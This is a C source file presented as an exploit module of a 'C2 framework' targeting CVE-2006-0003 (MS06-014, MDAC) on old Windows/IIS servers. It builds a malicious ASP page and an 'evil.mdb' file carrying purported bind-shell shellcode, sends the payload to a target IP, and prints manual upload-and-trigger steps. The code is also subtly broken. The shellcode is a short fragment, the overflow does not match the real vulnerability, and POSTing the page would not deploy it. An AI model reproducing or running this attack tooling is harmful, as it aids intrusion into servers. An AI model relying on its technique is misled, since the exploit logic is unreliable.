/*
 * Moonlight C2 Framework - MS06-014 Exploit Module
 * CVE-2006-0003 - Microsoft MDAC Remote Code Execution
 * Target: Windows 2000, XP, Server 2003
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define HTTP_PORT 80

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS06-014 Exploit Module\n");
    printf("CVE-2006-0003 - MDAC Remote Code Execution\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

// Shellcode: bind shell on port 4444
unsigned char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x33\xC9\x83\xE9\xAF\xE8\xFF\xFF\xFF\xFF\xC0\x5E\x81\x76\x0E"
    "\xFC\x90\x90\x90\xFC\x90\x90\x90";

char* generate_mdac_exploit(const char* target_ip, int target_port) {
    // ADO exploit via malicious ASP page
    const char* exploit_template = 
        "<%@ Language=VBScript %>\n"
        "<html>\n"
        "<body>\n"
        "<%\n"
        "' MDAC Exploit - CVE-2006-0003\n"
        "Dim conn, rs\n"
        "Set conn = Server.CreateObject(\"ADODB.Connection\")\n"
        "Set rs = Server.CreateObject(\"ADODB.Recordset\")\n\n"
        
        "' Connection string with exploit\n"
        "Dim connStr\n"
        "connStr = \"Provider=Microsoft.Jet.OLEDB.4.0;\" & _\n"
        "          \"Data Source=C:\\\\evil.mdb;\" & _\n"
        "          \"Extended Properties=\" & String(1000, \"A\") & \";\"\n\n"
        
        "On Error Resume Next\n"
        "conn.Open connStr\n\n"
        
        "If Err.Number <> 0 Then\n"
        "    Response.Write \"Error: \" & Err.Description\n"
        "Else\n"
        "    Response.Write \"Success\"\n"
        "End If\n\n"
        
        "Set rs = Nothing\n"
        "Set conn = Nothing\n"
        "%>\n"
        "</body>\n"
        "</html>\n";
    
    size_t len = strlen(exploit_template) + 1;
    char* exploit = (char*)malloc(len);
    if (exploit) {
        strcpy(exploit, exploit_template);
    }
    
    return exploit;
}

BOOL deliver_exploit(const char* target_ip, const char* exploit_content) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[4096];
    char response[4096];
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(HTTP_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("[*] Connecting to %s:%d...\n", target_ip, HTTP_PORT);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected\n");
    
    // Build HTTP POST request
    snprintf(request, sizeof(request),
        "POST /exploit.asp HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        target_ip, strlen(exploit_content), exploit_content);
    
    printf("[*] Sending exploit payload...\n");
    
    if (send(sock, request, strlen(request), 0) < 0) {
        printf("[!] Send failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Payload sent\n");
    printf("[*] Waiting for response...\n");
    
    int received = recv(sock, response, sizeof(response) - 1, 0);
    if (received > 0) {
        response[received] = '\0';
        printf("[+] Response received (%d bytes)\n", received);
        
        if (strstr(response, "200 OK")) {
            printf("[+] Server responded with 200 OK\n");
        }
    }
    
    closesocket(sock);
    WSACleanup();
    
    return TRUE;
}

void generate_malicious_mdb(const char* filename) {
    printf("[*] Generating malicious MDB file...\n");
    
    // Simple MDB file header
    unsigned char mdb_header[] = 
        "\x00\x01\x00\x00\x53\x74\x61\x6E\x64\x61\x72\x64\x20\x4A\x65\x74"
        "\x20\x44\x42\x00";
    
    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        printf("[!] Failed to create MDB file\n");
        return;
    }
    
    fwrite(mdb_header, 1, sizeof(mdb_header) - 1, fp);
    
    // Add padding and shellcode
    for (int i = 0; i < 1024; i++) {
        fputc('A', fp);
    }
    
    fwrite(shellcode, 1, sizeof(shellcode) - 1, fp);
    
    fclose(fp);
    printf("[+] Created %s\n", filename);
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        printf("Usage: %s <target_ip>\n\n", argv[0]);
        printf("This exploit targets MDAC vulnerability (MS06-014)\n");
        printf("Requires IIS with ASP support on target\n\n");
        return 1;
    }
    
    const char* target_ip = argv[1];
    
    printf("[*] Target: %s\n", target_ip);
    printf("[*] Generating exploit payload...\n");
    
    char* exploit = generate_mdac_exploit(target_ip, 4444);
    if (!exploit) {
        printf("[!] Failed to generate exploit\n");
        return 1;
    }
    
    // Save exploit to file
    FILE* fp = fopen("mdac_exploit.asp", "w");
    if (fp) {
        fprintf(fp, "%s", exploit);
        fclose(fp);
        printf("[+] Saved exploit to mdac_exploit.asp\n");
    }
    
    // Generate malicious MDB
    generate_malicious_mdb("evil.mdb");
    
    printf("\n[*] Manual deployment required:\n");
    printf("1. Upload mdac_exploit.asp to target IIS server\n");
    printf("2. Upload evil.mdb to C:\\ on target\n");
    printf("3. Browse to http://%s/mdac_exploit.asp\n", target_ip);
    printf("4. Exploit will trigger MDAC vulnerability\n\n");
    
    printf("[*] Attempting automatic exploitation...\n");
    
    if (deliver_exploit(target_ip, exploit)) {
        printf("\n[+] Exploit delivered successfully\n");
    } else {
        printf("\n[!] Automatic exploitation failed\n");
        printf("[*] Try manual deployment method\n");
    }
    
    free(exploit);
    
    return 0;
}
